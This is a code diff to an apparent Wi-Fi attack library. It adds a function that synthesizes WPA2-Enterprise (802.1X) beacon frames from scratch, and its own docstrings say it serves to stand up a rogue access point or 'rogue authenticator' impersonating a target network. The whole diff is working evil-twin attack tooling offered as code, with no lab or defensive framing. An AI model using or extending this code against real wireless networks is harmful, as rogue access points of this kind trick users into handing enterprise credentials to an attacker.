@@ -10,7 +10,7 @@ from typing import Optional
 from wifit3.dot11.chan import same_band
 from wifit3.dot11.ie import (
     GENERIC_RSN_IE, GENERIC_RSN_IE_ENTERPRISE, ds_param_ie, ext_rates_ie, force_psk_akm,
-    iter_information_elements, rates_ie,
+    iter_information_elements, rates_ie, ssid_ie,
 )
 from wifit3.dot11.rsn import AKM_802_1X, AKM_PSK
 from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
@@ -184,3 +184,17 @@ def beacon_clone_enterprise(real_beacon: bytes, decoy_channel: int, bssid: Optio
     """A twin beacon advertising WPA2/WPA3-Enterprise (802.1X AKM), for the rogue authenticator."""
     return beacon_clone(real_beacon, decoy_channel, bssid, akm=AKM_802_1X, pmf_capable=pmf_capable,
                         fallback_rsn=GENERIC_RSN_IE_ENTERPRISE)
+
+
+def build_enterprise_beacon(ssid: str, channel: int, bssid: bytes, *,
+                            pmf_capable: bool = False) -> bytes:
+    """Synthesize a WPA2-Enterprise (802.1X) beacon from scratch, for standing up a rogue AP when
+    the target network is not in range (no beacon to clone). ESS + Privacy, 802.1X RSN."""
+    header = mac_header(b"\x80\x00", b"\xff\xff\xff\xff\xff\xff", bssid, bssid)
+    fixed = struct.pack("<QHH", 0, 100, _CAP_ESS_PRIVACY)      # timestamp, interval (TU), capability
+    rsn = GENERIC_RSN_IE_ENTERPRISE
+    if pmf_capable:
+        rsn = force_psk_akm(rsn, akm=AKM_802_1X, pmf_capable=True) or rsn
+    ies = (ssid_ie(ssid) + rates_ie(channel) + ext_rates_ie(channel)
+           + ds_param_ie(channel) + rsn)
+    return header + fixed + ies
